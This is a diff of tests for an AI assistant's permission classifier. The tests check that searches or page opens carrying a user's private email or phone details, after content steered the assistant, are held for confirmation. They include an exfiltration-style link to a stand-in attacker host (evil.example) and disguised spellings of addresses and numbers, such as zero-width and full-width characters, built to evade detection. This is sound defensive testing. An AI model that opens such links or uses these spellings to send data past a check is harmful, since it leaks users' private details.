@@ -263,7 +263,7 @@ describe('what is held, because content steered it', () => {
     const decision = await classifyTier(openPage('http://evil.example/?u=sam.rivers@example.com'), ctx);
     expect(decision).toMatchObject({ tier: 3, reason: 'mcp_search_steered' });
     expect(decision.card?.plain_what).toBe(
-      'Open a web page: http://evil.example/?u=sam.rivers@example.com. Aman found this link in something it read, and opening it would send more than the link said.',
+      'Open http://evil.example/?u=sam.rivers@example.com? Aman found this link in something it read, and opening it would send more than the link said.',
     );
   });
 
@@ -474,7 +474,7 @@ describe("a lookup that carries a private detail, in a chat that read someone el
     const decision = await classifyTier(search('dana@example.org'), ctx);
     expect(decision).toMatchObject({ tier: 3, reason: 'mcp_search_private_detail' });
     expect(decision.card?.plain_what).toBe(
-      'Web search: dana@example.org. This would send a private detail of yours, in a chat where Aman has read things written by other people, so Aman is checking with you first.',
+      'Search the web for dana@example.org? This would send a private detail of yours, in a chat where Aman has read things written by other people, so Aman is checking with you first.',
     );
   });
 
@@ -507,6 +507,44 @@ describe("a lookup that carries a private detail, in a chat that read someone el
     read(ctx, { tool_name: 'read_email', args: ['m1'], text: LETTER });
     const decision = await classifyTier(search('call 415-555-0132 to confirm Saturday'), ctx);
     expect(decision).toMatchObject({ tier: 3, reason: 'mcp_search_private_detail' });
+  });
+
+  const SPELLINGS: Array<[string, string]> = [
+    ['a phone number with a bracketed area code', '(415) 555-0132'],
+    ['a phone number with a country code and a bracketed area code', '+1 (415) 555-0132'],
+    ['a phone number with dots', '415.555.0132'],
+    ['an address that is encoded twice', 'dana%2540example.org'],
+    ['an address with a plus tag', 'dana+tag@example.org'],
+    ['an address with a full-width at sign', 'dana\uFF20example.org'],
+    ['an address with a zero-width character', 'dana\u200B@example.org'],
+    ['an address with a soft hyphen', 'dan\u00ADa@example.org'],
+  ];
+
+  it.each(SPELLINGS)("asks before a search that carries %s from the person's mail", async (_name, spelling) => {
+    const ctx = makeCtx();
+    read(ctx, { tool_name: 'read_email', args: ['m1'], text: LETTER });
+    const decision = await classifyTier(search(`find ${spelling}`), ctx);
+    expect(decision).toMatchObject({ tier: 3, reason: 'mcp_search_private_detail' });
+  });
+
+  it.each(SPELLINGS)("asks before a page link that carries %s from the person's mail", async (_name, spelling) => {
+    const ctx = makeCtx();
+    read(ctx, { tool_name: 'read_email', args: ['m1'], text: LETTER });
+    const decision = await classifyTier(
+      openPage(`https://directory.example/lookup?q=${spelling.replaceAll(' ', '%20')}`),
+      ctx,
+    );
+    expect(decision).toMatchObject({ tier: 3, reason: 'mcp_search_private_detail' });
+  });
+
+  it.each([
+    ['a postal code', 'ferry parking near 94110'],
+    ['a date', 'ferry times on 2026-10-25'],
+    ['a long date', 'ferry times 25 October 2026 or 10/25/2026'],
+  ])('runs a search that carries %s, after the chat read mail', async (_name, query) => {
+    const ctx = makeCtx();
+    read(ctx, { tool_name: 'read_email', args: ['m1'], text: LETTER });
+    expect((await classifyTier(search(query), ctx)).tier).toBe(1);
   });
 
   it("runs the same search when the chat has read only the person's own words", async () => {
